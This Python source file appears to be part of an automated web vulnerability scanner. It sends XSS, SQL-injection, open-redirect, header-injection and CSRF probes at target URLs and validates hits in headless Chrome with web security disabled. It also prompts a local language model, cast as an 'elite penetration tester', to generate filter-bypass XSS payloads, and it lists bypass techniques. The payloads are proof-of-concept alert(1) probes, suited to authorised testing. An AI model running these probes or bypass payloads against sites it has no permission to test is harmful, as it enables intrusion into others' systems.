#task_xss.py
import requests
import urllib.parse
import time
import re
import json
import random
import string
import subprocess
import shutil
from bs4 import BeautifulSoup
from urllib.parse import urlencode
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException
import threading
import concurrent.futures
from ai_core import ask_ollama
def generate_exploits_for_target(target_info):
    if not target_info:
        return None
    vuln_type = target_info.get('type', 'XSS')
    parameter = target_info.get('parameter', 'unknown')
    sink_code = target_info.get('sink_code', '')
    source_code = target_info.get('source_code', '')
    description = target_info.get('description', '')
    filtering = target_info.get('filtering_detected', 'none')
    prompt = f"""You are an elite penetration tester specializing in XSS exploit development and filter bypass techniques. You have successfully bypassed security controls at major corporations and understand advanced evasion methods.
VULNERABILITY DETAILS:
Type: {vuln_type}
Parameter: {parameter}
Source Code: {source_code}
Sink Code: {sink_code}
Description: {description}
Detected Filtering: {filtering}
EXPLOIT DEVELOPMENT METHODOLOGY:
1. CONTEXT ANALYSIS:
   Analyze the sink context to understand execution environment:
   - If innerHTML: HTML context, tags and attributes work
   - If setTimeout/eval: JavaScript execution context
   - If document.write: Direct HTML injection
   - If attribute assignment: Attribute context
2. FILTER ANALYSIS:
   Based on the filtering detected, identify bypass strategies:
   - Script tag filters: Use event handlers, javascript: protocol
   - Event handler filters: Use alternative tags, encoding
   - Keyword filters: Use encoding, case variation, fragmentation
   - Character filters: Use HTML entities, Unicode variants
3. PAYLOAD CRAFTING PRINCIPLES:
   - Match payload to execution context
   - Use minimal syntax for maximum compatibility
   - Employ multiple bypass techniques simultaneously
   - Test boundary conditions and edge cases
ADVANCED BYPASS TECHNIQUES:
HTML Context Bypasses:
- <svg onload=alert(1)>
- <img src=x onerror=alert(1)>
- <details open ontoggle=alert(1)>
- <iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">
- <object data="javascript:alert(1)">
- <body onload=alert(1)>
JavaScript Context Bypasses:
- alert`1` (template literals)
- (alert)(1) (function wrapping)
- [].constructor.constructor('alert(1)')() (constructor chain)
- top['ale'+'rt'](1) (string concatenation)
Encoding Bypasses:
- &#97;lert(1) (decimal entities)
- &amp;#x61;lert(1) (hex entities)
- String.fromCharCode(97,108,101,114,116)(1) (character codes)
- unescape('%61%6c%65%72%74') (URL encoding)
Protocol Bypasses:
- javascript:alert(1)
- JaVaScRiPt:alert(1) (case variation)
- java&#115;cript:alert(1) (entity encoding)
- data:text/html,<script>alert(1)</script>
Generate 12 sophisticated payloads specifically designed for this vulnerability:
Respond with valid JSON:
{{
    "exploit_analysis": "Technical analysis of the vulnerability and recommended attack approach based on sink context",
    "bypass_strategy": "Specific strategy for bypassing detected filters",
    "payloads": [
        {{
            "payload": "crafted_exploit_payload",
            "technique": "specific_bypass_method_used",
            "explanation": "technical explanation of why this payload works for this specific sink and bypasses detected filters",
            "confidence": 0.85
        }}
    ]
}}"""
    return ask_ollama(prompt)
def check_browser_support():
    """Return True if a Chrome/Chromium binary can be found (Linux, macOS, or Windows)."""
    # Linux / macOS: binary on PATH
    if shutil.which('google-chrome') or shutil.which('chrome') or shutil.which('chromium'):
        return True
    # Windows: Chrome is NOT on PATH by default — check common install locations
    import os
    win_paths = [
        os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\Application\chrome.exe"),
        os.path.expandvars(r"%PROGRAMFILES%\Google\Chrome\Application\chrome.exe"),
        os.path.expandvars(r"%PROGRAMFILES(X86)%\Google\Chrome\Application\chrome.exe"),
        os.path.expandvars(r"%LOCALAPPDATA%\Chromium\Application\chrome.exe"),
    ]
    for p in win_paths:
        if os.path.exists(p):
            return True
    return False
BROWSER_SUPPORT_AVAILABLE = check_browser_support()
class XSSProgressIndicator:
    def __init__(self, phase_name):
        self.phase_name = phase_name
        self.active = False
        self.thread = None
        self.current_test = ""
        self.test_count = 0
        self.total_tests = 0
    def start(self, total_tests=10):
        self.active = True
        self.total_tests = total_tests
        self.test_count = 0
        self.thread = threading.Thread(target=self._show_progress)
        self.thread.daemon = True
        self.thread.start()
    def update(self, test_count, current_test=""):
        self.test_count = test_count
        self.current_test = current_test
    def stop(self):
        self.active = False
        if self.thread:
            self.thread.join(timeout=1)
        print()
    def _show_progress(self):
        spinner = ["analyzing", "bypassing", "crafting", "testing", "exploiting", "validating"]
        i = 0
        while self.active:
            progress = (self.test_count / max(self.total_tests, 1)) * 100
            print(f"\r[{self.phase_name}] {spinner[i % len(spinner)]}... {progress:.1f}% - {self.current_test}",
                  end="", flush=True)
            i += 1
            time.sleep(0.4)
class DynamicXSSEngine:
    def __init__(self):
        self.chrome_driver = None
        self.session = requests.Session()
    def _setup_chrome_driver(self):
        # Reuse an already-running driver instead of launching a new process
        # for every payload (saves 30-120 s per payload on first use).
        if self.chrome_driver is not None:
            return True
        try:
            chrome_options = Options()
            chrome_options.add_argument("--headless=new")
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--disable-web-security")
            chrome_options.add_argument("--disable-logging")
            chrome_options.add_argument("--log-level=3")
            chrome_options.add_argument("--disable-extensions")
            chrome_options.add_argument("--disable-gpu")
            chrome_options.add_argument("--allow-running-insecure-content")
            print("[XSS] Starting shared Chrome session for DOM-XSS validation...")
            self.chrome_driver = webdriver.Chrome(options=chrome_options)
            self.chrome_driver.set_page_load_timeout(20)
            print("[XSS] Chrome session ready.")
            return True
        except Exception as e:
            print(f"\n[XSS] Chrome driver setup failed: {e}")
            return False
    def analyze_target_filters(self, url, test_param):
        try:
            probe_payloads = [
                ("<script>alert('XSS_TEST')</script>", "script_tag_probe"),
                ("javascript:alert('XSS_TEST')", "javascript_protocol_probe"),
                ("<img src=x onerror=alert('XSS_TEST')>", "img_onerror_probe"),
                ("<svg onload=alert('XSS_TEST')>", "svg_onload_probe"),
                ("eval('alert(\"XSS_TEST\")')", "eval_function_probe"),
                ("setTimeout('alert(\"XSS_TEST\")', 0)", "settimeout_probe")
            ]
            filter_analysis = {
                "detected_filters": [],
                "response_patterns": [],
                "injection_context": "unknown",
                "content_type": "text/html",
                "security_headers": {},
                "filter_characteristics": {}
            }
            print(f"\n[XSS-FILTER] Analyzing security controls for parameter: {test_param}")
            for payload, probe_type in probe_payloads:
                parsed_u = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed_u.query)
                qs[test_param] = [payload]
                new_query = urllib.parse.urlencode(qs, doseq=True)
                test_url = urllib.parse.urlunparse((parsed_u.scheme, parsed_u.netloc, parsed_u.path, parsed_u.params, new_query, parsed_u.fragment))
                try:
                    response = self.session.get(test_url, timeout=10)
                    response_text = response.text.lower()
                    response_headers = dict(response.headers)
                    filter_analysis["security_headers"].update(response_headers)
                    blocked_patterns = [
                        ("script", "script_tag_filter", ["malicious", "script patterns", "script tags"]),
                        ("javascript:", "javascript_protocol_filter", ["malicious", "javascript protocol"]),
                        (" onerror", "event_handler_filter", ["event handlers", "malicious"]),
                        (" onload", "event_handler_filter", ["event handlers", "malicious"]),
                        ("eval", "eval_function_filter", ["eval", "malicious function"]),
                        ("setTimeout", "settimeout_function_filter", ["setTimeout", "malicious function"])
                    ]
                    payload_reflected = payload.lower() in response_text
                    for keyword, filter_name, block_indicators in blocked_patterns:
                        if keyword in payload.lower():
                            for indicator in block_indicators:
                                if indicator in response_text and filter_name not in filter_analysis["detected_filters"]:
                                    filter_analysis["detected_filters"].append(filter_name)
                                    print(f"[XSS-FILTER] Detected filter: {filter_name}")
                    if payload_reflected:
                        if 'value="' in response_text:
                            context_match = re.search(f'value="[^"]*{re.escape(payload.lower())}[^"]*"', response_text)
                            if context_match:
                                filter_analysis["injection_context"] = "attribute_value"
                        elif f'<{payload.lower()}' in response_text or f'{payload.lower()}>' in response_text:
                            filter_analysis["injection_context"] = "html_content"
                        elif f'>{payload.lower()}<' in response_text:
                            filter_analysis["injection_context"] = "text_node"
                        else:
                            filter_analysis["injection_context"] = "mixed_context"
                    filter_analysis["response_patterns"].append({
                        "probe_type": probe_type,
                        "payload": payload,
                        "reflected": payload_reflected,
                        "response_length": len(response_text),
                        "status_code": response.status_code,
                        "content_snippet": response_text[:300]
                    })
                except Exception as e:
                    print(f"[XSS-FILTER] Error testing {probe_type}: {e}")
                    continue
            csp_header = filter_analysis["security_headers"].get('content-security-policy', '')
            if csp_header:
                if "'unsafe-inline'" not in csp_header.lower():
                    filter_analysis["detected_filters"].append("csp_inline_restriction")
                if "'unsafe-eval'" not in csp_header.lower():
                    filter_analysis["detected_filters"].append("csp_eval_restriction")
            print(f"[XSS-FILTER] Analysis complete. Detected {len(filter_analysis['detected_filters'])} security controls")
            return filter_analysis
        except Exception as e:
            print(f"[XSS-FILTER] Filter analysis failed: {e}")
            return {"detected_filters": [], "response_patterns": [], "injection_context": "unknown"}
    def get_ai_bypass_payloads(self, target_url, filter_analysis, source_code):
        detected_filters = filter_analysis.get('detected_filters', [])
        injection_context = filter_analysis.get('injection_context', 'unknown')
        print(f"\n[XSS-AI] Requesting dynamic bypass payloads from AI model for {target_url}...")
        print(f"[XSS-AI] Injection context: {injection_context} | Active filters: {detected_filters}")

        ai_prompt = f"""You are an advanced penetration tester crafting XSS payloads.
Target: {target_url}
Context: {injection_context}
Filters: {detected_filters}

Generate 4 to 6 diverse, high-impact XSS payloads to trigger JavaScript execution (alert(1)) in this context.
Respond ONLY in valid JSON:
{{
    "payloads": [
        {{"payload": "<script>alert(1)</script>", "technique": "script_tag", "confidence": 0.9}},
        {{"payload": "<img src=x onerror=alert(1)>", "technique": "img_onerror", "confidence": 0.9}},
        {{"payload": "\"><script>alert(1)</script>", "technique": "attr_breakout_script", "confidence": 0.85}},
        {{"payload": "<svg onload=alert(1)>", "technique": "svg_onload", "confidence": 0.9}}
    ]
}}"""
        ai_response = ask_ollama(ai_prompt)
        if ai_response and isinstance(ai_response, dict) and ai_response.get("payloads"):
            print(f"[XSS-AI] Received {len(ai_response['payloads'])} dynamically generated payloads from AI model.")
            return ai_response["payloads"]

        # Fast fallback to curated static library if Ollama is unreachable
        print("[XSS-AI] Using curated payload library as fallback.")
        return [
            {"payload": "<script>alert(1)</script>", "technique": "script_tag", "confidence": 0.9},
            {"payload": "<img src=x onerror=alert(1)>", "technique": "img_onerror", "confidence": 0.9},
            {"payload": "<svg onload=alert(1)>", "technique": "svg_onload", "confidence": 0.9},
            {"payload": "\"><script>alert(1)</script>", "technique": "attr_breakout_script", "confidence": 0.85},
            {"payload": "'><svg onload=alert(1)>", "technique": "attr_breakout_svg", "confidence": 0.85},
            {"payload": "javascript:alert(1)", "technique": "js_protocol", "confidence": 0.6},
        ]
    def validate_xss_advanced(self, test_url, payload, technique):
        # ── Fast path: HTTP reflection check (works for all reflected XSS) ──
        # This avoids a ~2-minute Chrome startup for payloads that simply
        # reflect unescaped HTML — the most common real-world XSS class.
        quick_result = self.validate_with_analysis(test_url, payload, technique)
        if quick_result.get('xss_confirmed'):
            return quick_result

        # ── Slow path: actual browser execution (DOM-XSS / JS-context) ──
        # Only attempt when the HTTP check wasn't conclusive AND Chrome is available.
        if BROWSER_SUPPORT_AVAILABLE:
            return self.validate_with_browser(test_url, payload, technique)
        return quick_result

    def validate_with_browser(self, test_url, payload, technique):
        # Reuse the existing driver — avoid the 30-120 s startup cost per payload.
        if not self._setup_chrome_driver():
            return self.validate_with_analysis(test_url, payload, technique)
        try:
            # Dismiss any alert left over from a previous payload test
            try:
                leftover = self.chrome_driver.switch_to.alert
                leftover.accept()
            except Exception:
                pass

            self.chrome_driver.get(test_url)

            # ── Check 1: JavaScript alert dialog (classic XSS trigger) ──
            try:
                wait = WebDriverWait(self.chrome_driver, 2)
                alert = wait.until(EC.alert_is_present())
                alert_text = alert.text
                alert.accept()
                return {
                    'xss_confirmed': True,
                    'validation_method': 'browser_alert_dialog',
                    'confidence': 1.0,
                    'alert_text': alert_text,
                    'technique': technique
                }
            except TimeoutException:
                pass

            # ── Check 2: DOM XSS — check if innerHTML of #out contains our payload ──
            # This catches /?callback= and /?html= DOM injection vectors
            try:
                out_inner = self.chrome_driver.execute_script(
                    "var el=document.getElementById('out'); return el ? el.innerHTML : '';"
                )
                if out_inner and payload.lower() in out_inner.lower():
                    # payload landed inside innerHTML — XSS sink confirmed
                    return {
                        'xss_confirmed': True,
                        'validation_method': 'dom_xss_innerhtml',
                        'xss_type': 'DOM_XSS',
                        'confidence': 0.95,
                        'dom_sink': 'div#out.innerHTML',
                        'technique': technique
                    }
            except Exception:
                pass

            # ── Check 3: page source / context analysis fallback ──
            try:
                page_source = self.chrome_driver.page_source
                console_logs = self.chrome_driver.get_log('browser')
                return self.analyze_execution_context(page_source, payload, console_logs, technique)
            except Exception:
                return {'xss_confirmed': False, 'technique': technique}

        except Exception as e:
            # Chrome may have crashed — reset so next call gets a fresh driver
            try:
                self.chrome_driver.quit()
            except Exception:
                pass
            self.chrome_driver = None
            return self.validate_with_analysis(test_url, payload, technique)
        # NOTE: intentionally NOT quitting Chrome here — reuse the driver
        # for subsequent payloads.  cleanup() will quit it when all done.

    def check_jsonp_injection(self, base_url):
        """Test whether a URL endpoint is vulnerable to JSONP injection.
        A vulnerable endpoint wraps its JSON response in a user-controlled
        function name, e.g. GET /api/search?callback=evil → evil({'result':''}).
        Returns a vulnerability dict or None.
        """
        import urllib.parse
        # Common JSONP parameter names
        jsonp_params = ['callback', 'jsonp', 'cb', 'fn', 'func', 'handler']
        probe = 'JSONP_PROBE_' + ''.join(random.choices(string.ascii_uppercase, k=6))
        parsed = urllib.parse.urlparse(base_url)
        qs = urllib.parse.parse_qs(parsed.query)
        for jp in jsonp_params:
            qs_test = dict(qs)
            qs_test[jp] = [probe]
            test_url = urllib.parse.urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, urllib.parse.urlencode(qs_test, doseq=True), parsed.fragment
            ))
            try:
                resp = self.session.get(test_url, timeout=10)
                # JSONP response wraps body in: probeName({...})
                body = resp.text.strip()
                if body.startswith(probe):
                    print(f"[XSS-JSONP] JSONP injection confirmed at {test_url}")
                    return {
                        'type': 'JSONP_INJECTION',
                        'xss_type': 'JSONP',
                        'parameter': jp,
                        'url': base_url,
                        'test_url': test_url,
                        'payload': probe,
                        'technique': 'jsonp_callback_injection',
                        'confidence': 0.98,
                        'validation_method': 'response_wrapping',
                        'description': f'Endpoint wraps response in user-controlled function name via ?{jp}= — enables XSS via JSONP hijacking'
                    }
            except Exception as e:
                print(f"[XSS-JSONP] Error testing {test_url}: {e}")
        return None

    def check_sql_injection(self, base_url, param):
        """Test for SQL injection by injecting SQL syntax probes and detecting query reflection or errors."""
        sqli_probes = [
            ("1' OR '1'='1", "boolean_based_probe"),
            ("1' AND '1'='2", "boolean_false_probe"),
            ("1' UNION SELECT 1,2,3--", "union_based_probe"),
            ("1'", "syntax_error_probe")
        ]
        parsed = urllib.parse.urlparse(base_url)
        qs = urllib.parse.parse_qs(parsed.query)
        for probe, technique in sqli_probes:
            qs_test = dict(qs)
            qs_test[param] = [probe]
            test_url = urllib.parse.urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, urllib.parse.urlencode(qs_test, doseq=True), parsed.fragment
            ))
            try:
                resp = self.session.get(test_url, timeout=10)
                body = resp.text
                sqli_error_signatures = [
                    "select * from", "syntax error", "sqlite3.", "operationalerror",
                    "mysql_fetch", "unclosed quotation mark", "pg_query", "ora-", "sql syntax"
                ]
                body_lower = body.lower()
                for sig in sqli_error_signatures:
                    if sig in body_lower:
                        print(f"[SQLI] SQL Injection confirmed at {test_url} (matched signature: {sig})")
                        return {
                            'type': 'SQL_INJECTION',
                            'parameter': param,
                            'url': base_url,
                            'test_url': test_url,
                            'payload': probe,
                            'technique': technique,
                            'confidence': 0.95,
                            'validation_method': 'error_or_query_reflection',
                            'description': f'Parameter {param} triggers SQL syntax error or raw query reflection ({sig})'
                        }
            except Exception:
                pass
        return None

    def check_open_redirect(self, base_url, param):
        """Test whether an endpoint redirects to an arbitrary external domain."""
        redirect_probes = [
            "https://example.com/pentest_verify",
            "//example.com/pentest_verify"
        ]
        parsed = urllib.parse.urlparse(base_url)
        qs = urllib.parse.parse_qs(parsed.query)
        for probe in redirect_probes:
            qs_test = dict(qs)
            qs_test[param] = [probe]
            test_url = urllib.parse.urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, urllib.parse.urlencode(qs_test, doseq=True), parsed.fragment
            ))
            try:
                resp = self.session.get(test_url, timeout=10, allow_redirects=False)
                if resp.status_code in [301, 302, 303, 307, 308]:
                    loc = resp.headers.get("Location", "")
                    if "example.com" in loc:
                        print(f"[REDIRECT] Open Redirect confirmed at {test_url} -> Location: {loc}")
                        return {
                            'type': 'OPEN_REDIRECT',
                            'parameter': param,
                            'url': base_url,
                            'test_url': test_url,
                            'payload': probe,
                            'technique': 'unvalidated_redirect',
                            'confidence': 1.0,
                            'validation_method': 'http_status_redirect',
                            'description': f'Parameter {param} allows arbitrary external URL redirection to {loc}'
                        }
            except Exception:
                pass
        return None

    def check_header_injection(self, base_url, param):
        """Test whether input reflects into HTTP response headers (CRLF / Header injection)."""
        probe = "PENTEST_HEADER_INJECT_VAL"
        parsed = urllib.parse.urlparse(base_url)
        qs = urllib.parse.parse_qs(parsed.query)
        qs_test = dict(qs)
        qs_test[param] = [probe]
        test_url = urllib.parse.urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, urllib.parse.urlencode(qs_test, doseq=True), parsed.fragment
        ))
        try:
            resp = self.session.get(test_url, timeout=10)
            for header_name, header_val in resp.headers.items():
                if probe in header_val:
                    print(f"[HEADER-INJECT] Response Header Injection confirmed at {test_url} -> {header_name}: {header_val}")
                    return {
                        'type': 'HEADER_INJECTION',
                        'parameter': param,
                        'url': base_url,
                        'test_url': test_url,
                        'payload': probe,
                        'technique': 'response_header_reflection',
                        'confidence': 0.95,
                        'validation_method': 'header_inspection',
                        'description': f'Parameter {param} directly injected into HTTP response header {header_name}'
                    }
        except Exception:
            pass
        return None

    def check_csrf_exposure(self, base_url, param):
        """Test whether state-changing actions are vulnerable to CSRF via GET requests without protection."""
        parsed = urllib.parse.urlparse(base_url)
        path_lower = parsed.path.lower()
        state_changing_keywords = ['delete', 'remove', 'update', 'modify', 'change', 'reset', 'transfer', 'drop']
        if any(kw in path_lower for kw in state_changing_keywords):
            try:
                resp = self.session.get(base_url, timeout=10)
                if resp.status_code == 200:
                    text_lower = resp.text.lower()
                    if any(kw in text_lower for kw in ['deleted', 'removed', 'updated', 'success', 'done']):
                        print(f"[CSRF] Insecure State-Changing GET endpoint (CSRF) confirmed at {base_url}")
                        return {
                            'type': 'CSRF_VULNERABILITY',
                            'parameter': param,
                            'url': base_url,
                            'test_url': base_url,
                            'payload': 'GET_STATE_CHANGE',
                            'technique': 'unprotected_get_state_change',
                            'confidence': 0.90,
                            'validation_method': 'state_change_without_token',
                            'description': f'Sensitive state-changing action at {parsed.path} can be triggered via GET request with no CSRF token protection'
                        }
            except Exception:
                pass
        return None

    def cleanup(self):
        """Quit the shared Chrome driver when the full XSS test is complete."""
        if self.chrome_driver:
            try:
                self.chrome_driver.quit()
            except Exception:
                pass
            self.chrome_driver = None

    def analyze_execution_context(self, page_source, payload, console_logs, technique):
        payload_lower = payload.lower()
        source_lower = page_source.lower()
        if payload_lower in source_lower:
            # If the payload contains literal HTML tag markers AND appears
            # un-encoded in the page source, the browser will render it as
            # live markup — strong evidence of a real XSS sink.
            payload_is_html_tag = '<' in payload and '>' in payload
            if payload_is_html_tag:
                return {
                    'xss_confirmed': True,
                    'validation_method': 'unescaped_tag_reflection',
                    'confidence': 0.85,
                    'technique': technique
                }
            dangerous_contexts = [
                (r'<script[^>]*>.*?' + re.escape(payload_lower) + r'.*?</script>', 0.95),
                (r'javascript:\s*' + re.escape(payload_lower), 0.9),
                (r'on\w+\s*=\s*["\']?[^"\']*' + re.escape(payload_lower), 0.85),
                (r'<[^>]*\s+on\w+[^>]*' + re.escape(payload_lower), 0.8),
                (r'setTimeout\s*\(\s*["\']?[^"\']*' + re.escape(payload_lower), 0.9),
                (r'eval\s*\([^)]*' + re.escape(payload_lower), 0.95)
            ]
            for pattern, confidence in dangerous_contexts:
                if re.search(pattern, source_lower, re.DOTALL):
                    return {
                        'xss_confirmed': True,
                        'validation_method': 'context_analysis',
                        'confidence': confidence,
                        'matched_pattern': pattern,
                        'technique': technique
                    }
            if technique in ["setTimeout", "eval", "constructor"]:
                return {
                    'xss_confirmed': False,
                    'validation_method': 'payload_in_html_context',
                    'confidence': 0.1,
                    'explanation': 'Payload was reflected but not executed. A JavaScript statement cannot run in an innerHTML sink.',
                    'technique': technique
                }
            return {
                'xss_confirmed': True,
                'validation_method': 'reflection_detected',
                'confidence': 0.6,
                'technique': technique
            }
        return {'xss_confirmed': False, 'technique': technique}

    def validate_with_analysis(self, test_url, payload, technique):
        try:
            response = self.session.get(test_url, timeout=10)
            return self.analyze_execution_context(response.text, payload, [], technique)
        except:
            return {'xss_confirmed': False, 'technique': technique}
class IntelligentXSSAnalyzer:
    def __init__(self, session=None):
        self.session = session or requests.Session()
        self.xss_engine = DynamicXSSEngine()
        self.xss_engine.session = self.session
        if not BROWSER_SUPPORT_AVAILABLE:
            print("\n[XSS] Chrome not available, using response analysis")

    def comprehensive_xss_testing(self, target_data_list):
        """Test ALL targets for ALL vulnerability types.
        Returns a LIST of all confirmed vulnerability dicts (not just the first).
        """
        all_vulns = []
        tested_jsonp_urls = set()  # avoid re-testing the same base URL for JSONP
        tested_targets = set()     # avoid re-testing the same (url, parameter) pair

        for target_data in target_data_list:
            target_url = target_data.get("url")
            ai_analysis = target_data.get("ai_analysis")
            params = target_data.get("params")

            # ── JSONP Injection check (once per unique base path) ──
            parsed_base = urllib.parse.urlparse(target_url)
            base_key = parsed_base.scheme + '://' + parsed_base.netloc + parsed_base.path
            if base_key not in tested_jsonp_urls:
                tested_jsonp_urls.add(base_key)
                print(f"\n[XSS-JSONP] Checking for JSONP injection at {base_key}")
                jsonp_vuln = self.xss_engine.check_jsonp_injection(target_url)
                if jsonp_vuln:
                    print(f"[XSS-JSONP] FOUND: {jsonp_vuln['type']} on {target_url} via ?{jsonp_vuln['parameter']}=")
                    all_vulns.append(jsonp_vuln)

            # ── Reflected / DOM XSS parameter testing ──
            test_params = []
            if ai_analysis and ai_analysis.get("parameter"):
                test_params = [ai_analysis.get("parameter")]
            elif params:
                test_params = list(params[:3])
            else:
                test_params = self._discover_parameters(target_url)

            # Always ensure DOM XSS params are tested when URL is the root
            if parsed_base.path in ('/', ''):
                for dom_param in ['callback', 'html']:
                    if dom_param not in test_params:
                        test_params.append(dom_param)

            if not test_params:
                print(f"\n[XSS] No testable parameters found for {target_url}")
                continue

            for param in test_params:
                param_key = (base_key, param)
                if param_key in tested_targets:
                    continue
                tested_targets.add(param_key)
                print(f"\n[SCAN] Starting multi-vector security analysis for {target_url} parameter: {param}")

                # Concurrently execute non-browser HTTP checks for this parameter
                with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
                    f_sqli = executor.submit(self.xss_engine.check_sql_injection, target_url, param)
                    f_redir = executor.submit(self.xss_engine.check_open_redirect, target_url, param)
                    f_hdr = executor.submit(self.xss_engine.check_header_injection, target_url, param)
                    f_csrf = executor.submit(self.xss_engine.check_csrf_exposure, target_url, param)
                    f_filt = executor.submit(self.xss_engine.analyze_target_filters, target_url, param)
                    
                    sqli_vuln = f_sqli.result()
                    redirect_vuln = f_redir.result()
                    header_vuln = f_hdr.result()
                    csrf_vuln = f_csrf.result()
                    filter_analysis = f_filt.result()

                # ── Vector 1: SQL Injection Check ──
                if sqli_vuln:
                    print(f"[SCAN] ✅ Confirmed SQL Injection: {sqli_vuln['url']} (param: {sqli_vuln['parameter']})")
                    all_vulns.append(sqli_vuln)

                # ── Vector 2: Open Redirect Check ──
                if redirect_vuln:
                    print(f"[SCAN] ✅ Confirmed Open Redirect: {redirect_vuln['url']} (param: {redirect_vuln['parameter']})")
                    all_vulns.append(redirect_vuln)

                # ── Vector 3: HTTP Response Header Injection Check ──
                if header_vuln:
                    print(f"[SCAN] ✅ Confirmed Header Injection: {header_vuln['url']} (param: {header_vuln['parameter']})")
                    all_vulns.append(header_vuln)

                # ── Vector 4: Missing CSRF Protection Check ──
                if csrf_vuln and not any(v.get('url') == target_url and v.get('type') == 'CSRF_VULNERABILITY' for v in all_vulns):
                    print(f"[SCAN] ✅ Confirmed CSRF Exposure: {csrf_vuln['url']}")
                    all_vulns.append(csrf_vuln)

                # ── Vector 5: Reflected & DOM XSS Dynamic Browser Testing ──
                try:
                    source_response = self.session.get(target_url, timeout=10)
                    source_code = source_response.text
                except:
                    source_code = ""
                print(f"[XSS] Filter analysis complete - detected: {filter_analysis.get('detected_filters', [])}")
                ai_payloads = self.xss_engine.get_ai_bypass_payloads(target_url, filter_analysis, source_code)
                if not ai_payloads:
                    print(f"[XSS] AI payload generation failed for {param}")
                    continue
                param_vuln_found = False
                progress = XSSProgressIndicator("XSS_INTEL")
                progress.start(len(ai_payloads))
                for i, payload_info in enumerate(ai_payloads, 1):
                    payload = payload_info.get('payload', '')
                    technique = payload_info.get('technique', 'AI_GENERATED')
                    confidence = payload_info.get('confidence', 0.5)
                    explanation = payload_info.get('explanation', '')
                    progress.update(i, f"{technique}: {payload[:30]}...")
                    parsed_u = urllib.parse.urlparse(target_url)
                    qs = urllib.parse.parse_qs(parsed_u.query)
                    qs[param] = [payload]
                    new_query = urllib.parse.urlencode(qs, doseq=True)
                    test_url = urllib.parse.urlunparse((
                        parsed_u.scheme, parsed_u.netloc, parsed_u.path,
                        parsed_u.params, new_query, parsed_u.fragment
                    ))
                    validation_result = self.xss_engine.validate_xss_advanced(test_url, payload, technique)
                    if validation_result.get('xss_confirmed'):
                        progress.stop()
                        xss_type = validation_result.get('xss_type', 'REFLECTED_XSS')
                        if validation_result.get('validation_method') == 'dom_xss_innerhtml':
                            xss_type = 'DOM_XSS'
                        vulnerability = {
                            'type': xss_type,
                            'parameter': param,
                            'payload': payload,
                            'technique': technique,
                            'url': target_url,
                            'test_url': test_url,
                            'confidence': max(confidence, validation_result.get('confidence', 0.8)),
                            'validation_method': validation_result.get('validation_method', 'unknown'),
                            'ai_explanation': explanation,
                            'bypassed_filters': filter_analysis.get('detected_filters', []),
                            'injection_context': filter_analysis.get('injection_context', 'unknown'),
                            'dom_sink': validation_result.get('dom_sink', '')
                        }
                        print(f"\n[XSS] ✅ VULNERABILITY CONFIRMED!")
                        print(f"[XSS] Type       : {xss_type}")
                        print(f"[XSS] Parameter  : {param}")
                        print(f"[XSS] Technique  : {technique}")
                        print(f"[XSS] Confidence : {vulnerability['confidence']:.1%}")
                        if explanation:
                            print(f"[XSS] Explanation: {explanation}")
                        all_vulns.append(vulnerability)
                        param_vuln_found = True
                        break  # one confirmed payload per param is enough — move to next param
                if not param_vuln_found:
                    progress.stop()

        # Clean up the shared Chrome session once all targets are processed
        self.xss_engine.cleanup()
        if all_vulns:
            print(f"\n[XSS] ══ SCAN COMPLETE: {len(all_vulns)} vulnerability(s) found ══")
            for i, v in enumerate(all_vulns, 1):
                print(f"  [{i}] {v.get('type','XSS')} | {v.get('url','')} | param={v.get('parameter','')} | confidence={v.get('confidence',0):.0%}")
        else:
            print(f"\n[XSS] Intelligent analysis complete. No vulnerabilities found.")
        return all_vulns  # always return a list

    def _discover_parameters(self, url):
        discovered_params = []
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            for form in soup.find_all('form'):
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    name = input_tag.get('name')
                    if name and name not in discovered_params:
                        discovered_params.append(name)
            for script in soup.find_all('script'):
                script_content = script.string or ""
                param_matches = re.findall(
                    r'(?:searchParams\.get|getParam|getUrlParam)\([\'"]([^\'\"]+)[\'\"]\)',
                    script_content
                )
                discovered_params.extend(param_matches)
            # Ensure DOM XSS params are only added for root path
            parsed_path = urllib.parse.urlparse(url).path
            if parsed_path in ('/', ''):
                for dom_p in ['callback', 'html']:
                    if dom_p not in discovered_params:
                        discovered_params.append(dom_p)
            # Check URL query string parameters as well
            parsed_query = urllib.parse.parse_qs(urllib.parse.urlparse(url).query)
            for qp in parsed_query.keys():
                if qp not in discovered_params:
                    discovered_params.append(qp)
        except Exception:
            pass
        return discovered_params[:5]


def execute_xss_test(session, target_data_list):
    """Run all XSS/JSONP tests and return a list of confirmed vulnerabilities."""
    if not target_data_list:
        return []
    try:
        analyzer = IntelligentXSSAnalyzer(session)
        return analyzer.comprehensive_xss_testing(target_data_list)
    except Exception as e:
        print(f"\n[XSS] Testing error: {e}")
        return []